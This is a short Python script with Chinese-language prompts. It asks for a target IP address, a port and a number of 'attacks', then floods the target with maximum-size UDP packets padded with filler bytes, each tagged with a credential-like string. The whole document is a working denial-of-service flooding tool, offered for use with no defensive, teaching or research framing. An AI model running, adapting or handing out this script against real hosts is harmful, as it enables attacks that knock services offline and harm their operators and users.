import socket
import pprint
UDP_IP = input("请输入目标IP:")
UDP_PORT = int(input("请输入目标端口:"))
a = int(input("请输入攻击次数:"))
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
MAX_SIZE = 65507
for x in range(a):
    data_str = f"u={x}&p=hm16b{x}"
    base_bytes = data_str.encode('utf-8')
    padding_size = MAX_SIZE - len(base_bytes)
    if padding_size > 0:
        padding = b'A' * padding_size
        data_bytes = base_bytes + padding
    else:
        data_bytes = base_bytes[:MAX_SIZE]
    udp_socket.sendto(data_bytes, (UDP_IP, UDP_PORT))
    print("UDP包发送成功")
    pprint.pprint(data_str)
udp_socket.close()
